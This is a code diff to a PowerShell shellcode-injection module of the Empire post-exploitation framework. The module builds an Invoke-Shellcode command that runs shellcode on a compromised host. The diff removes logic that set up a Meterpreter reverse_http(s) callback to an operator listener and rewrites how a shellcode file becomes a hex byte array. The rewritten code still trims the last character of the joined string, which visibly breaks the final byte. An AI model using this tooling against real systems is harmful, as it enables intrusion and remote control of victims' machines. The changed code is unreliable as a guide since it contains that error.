+++ empire/server/modules/powershell/code_execution/invoke_shellcode.py
@@ -6,7 +6,6 @@ from typing import Dict
 
 from empire.server.core.config import empire_config
 from empire.server.core.module_models import EmpireModule
-from empire.server.utils.module_util import handle_error_message
 
 
 class Module(object):
@@ -27,33 +26,6 @@ class Module(object):
 
         script_end = "\nInvoke-Shellcode -Force"
 
-        listener_name = params["Listener"]
-        if listener_name != "":
-            if not main_menu.listeners.is_listener_valid(listener_name):
-                return handle_error_message("[!] Invalid listener: " + listener_name)
-            else:
-                # TODO: redo pulling these listener configs...
-                # Old method no longer working
-                # temporary fix until a more elegant solution is in place, unless this is the most elegant???? :)
-                # [ID,name,host,port,cert_path,staging_key,default_delay,default_jitter,default_profile,kill_date,working_hours,listener_type,redirect_target,default_lost_limit] = main_menu.listeners.get_listener(listener_name)
-                # replacing loadedListeners call with listener_template_service's new_instance method.
-                # still doesn't seem right though since that's just laoding in the default. -vr
-                host = main_menu.listenertemplatesv2.new_instance(
-                    "meterpreter"
-                ).options["Host"]
-                port = main_menu.listenertemplatesv2.new_instance(
-                    "meterpreter"
-                ).options["Port"]
-
-                MSFpayload = "reverse_http"
-                if "https" in host:
-                    MSFpayload += "s"
-
-                hostname = host.split(":")[1].strip("/")
-                params["Lhost"] = str(hostname)
-                params["Lport"] = str(port)
-                params["Payload"] = str(MSFpayload)
-
         for option, values in params.items():
             if option.lower() != "agent" and option.lower() != "listener":
                 if values and values != "":
@@ -63,11 +35,9 @@ class Module(object):
                         script_end += " -" + str(option) + " @(" + sc + ")"
                     elif option.lower() == "file":
                         location = Path(empire_config.directories.downloads) / values
-                        with location.open("rb") as bin_data:
-                            shellcode_bin_data = bin_data.read()
-                        sc = ""
-                        for x in range(len(shellcode_bin_data)):
-                            sc += "0x{:02x}".format(shellcode_bin_data[x]) + ","
+                        with open(location, "rb") as f:
+                            byte_array = bytearray(f.read())
+                        sc = ",".join([f"0x{byte:02x}" for byte in byte_array])
                         script_end += f" -shellcode @({sc[:-1]})"
                     else:
                         script_end += " -" + str(option) + " " + str(values)